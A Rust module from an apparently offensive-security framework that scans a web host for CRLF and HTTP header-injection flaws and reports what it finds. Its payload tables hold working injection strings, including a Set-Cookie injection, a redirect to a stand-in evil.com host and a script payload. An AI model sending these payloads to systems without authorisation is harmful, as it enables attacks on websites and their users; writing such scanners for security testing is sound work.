use anyhow::{Context, Result};
use colored::*;
use std::time::Duration;

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};

/// CRLF payloads injected into URL query parameters to detect HTTP response
/// splitting / header injection vulnerabilities.
const CRLF_PAYLOADS: &[(&str, &str)] = &[
    ("crlf_test", "%0d%0aInjected-Header:%20crlf-vuln"),
    ("crlf_setcookie", "%0d%0aSet-Cookie:%20crlf=1;%20Path=/"),
    ("crlf_location", "%0d%0aLocation:%20https://evil.com"),
    ("crlf_xss", "%0d%0a%0d%0a<script>alert(1)</script>"),
];

/// Header values injected into Host / User-Agent / Referer.
const CRLF_HEADER_PAYLOADS: &[(&str, &str)] = &[
    ("Host", "evil.com%0d%0aInjected:%20crlf-host"),
    ("User-Agent", "Mozilla/5.0%0d%0aInjected:%20crlf-ua"),
    ("Referer", "https://google.com%0d%0aInjected:%20crlf-ref"),
];

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("crlf_scanner requires a single-host target")?;

    crate::mprintln!(
        "{}",
        format!("[*] CRLF Scanner — target: {}", target).cyan()
    );

    let port = ctx.options.get_or("port", 443u16);
    let timeout_secs = ctx.options.get_or("timeout", 10u64).clamp(1, 60);

    let client = crate::utils::build_http_client(Duration::from_secs(timeout_secs))?;
    let base_url = format!("https://{}:{}", target, port);

    let mut outcome = ModuleOutcome::ok();
    let mut tested = 0u32;
    let mut vulnerable = 0u32;

    // Phase 1: Query-parameter injection
    crate::mprintln!("{}", "[*] Phase 1: Query-parameter CRLF injection".dimmed());
    for (param_name, payload) in CRLF_PAYLOADS {
        let url = format!("{}/?{}={}", base_url, param_name, payload);
        match client.get(&url).send().await {
            Ok(resp) => {
                tested += 1;
                // Check for reflected CRLF in response headers
                let header_text = format!("{:?}", resp.headers());
                if header_text.contains("Injected:") || header_text.contains("crlf-vuln") {
                    let msg = format!(
                        "CRLF header injection via query param '{}': reflected 'Injected:' in response headers",
                        param_name
                    );
                    crate::mprintln!("{}", format!("[+] {}", msg).green());
                    outcome.findings.push(Finding {
                        target: target.to_string(),
                        kind: FindingKind::Vulnerable,
                        message: msg,
                        data: None,
                    });
                    vulnerable += 1;
                }
                // Check for reflected payload in response body
                let body = match resp.text().await {
                    Ok(b) => b,
                    Err(e) => {
                        crate::meprintln!(
                            "[-] Failed to read body for CRLF test on param '{}': {}",
                            param_name,
                            e
                        );
                        continue;
                    }
                };
                if body.contains("Injected:") || body.contains("<script>alert(1)</script>") {
                    let msg = format!(
                        "CRLF body injection via query param '{}': payload reflected in response body",
                        param_name
                    );
                    crate::mprintln!("{}", format!("[+] {}", msg).green());
                    outcome.findings.push(Finding {
                        target: target.to_string(),
                        kind: FindingKind::Vulnerable,
                        message: msg,
                        data: None,
                    });
                    vulnerable += 1;
                }
            }
            Err(e) => {
                crate::meprintln!("[-] CRLF param '{}' request failed: {:#}", param_name, e);
            }
        }
    }

    // Phase 2: Header injection
    crate::mprintln!("{}", "[*] Phase 2: Header CRLF injection".dimmed());
    for (header_name, payload) in CRLF_HEADER_PAYLOADS {
        let req = match client
            .get(&base_url)
            .header(*header_name, *payload)
            .send()
            .await
        {
            Ok(r) => r,
            Err(e) => {
                crate::meprintln!("[-] CRLF header '{}' request failed: {:#}", header_name, e);
                continue;
            }
        };
        tested += 1;
        let header_text = format!("{:?}", req.headers());
        if header_text.contains("Injected:") || header_text.contains("crlf-") {
            let msg = format!(
                "CRLF header injection via '{}' header: 'Injected:' reflected in response",
                header_name
            );
            crate::mprintln!("{}", format!("[+] {}", msg).green());
            outcome.findings.push(Finding {
                target: target.to_string(),
                kind: FindingKind::Vulnerable,
                message: msg,
                data: None,
            });
            vulnerable += 1;
        }
    }

    crate::mprintln!();
    crate::mprintln!("{}", "=== CRLF Scan Summary ===".bold());
    crate::mprintln!("  Target:         {}", target);
    crate::mprintln!("  Payloads sent:  {}", tested);
    crate::mprintln!("  Vulnerabilities: {}", vulnerable);

    Ok(outcome)
}

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "CRLF / HTTP Header Injection Scanner".to_string(),
        description: "Injects CRLF payloads into URL query parameters and HTTP headers (Host, User-Agent, Referer) to detect HTTP response splitting and header injection vulnerabilities.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec!["https://owasp.org/www-community/attacks/CRLF_Injection".to_string()],
        disclosure_date: None,
        rank: ModuleRank::Normal,
        default_port: Some(443),
    }
}

crate::register_native_module!(crate::module::Category::Scanners, "crlf_scanner", native);
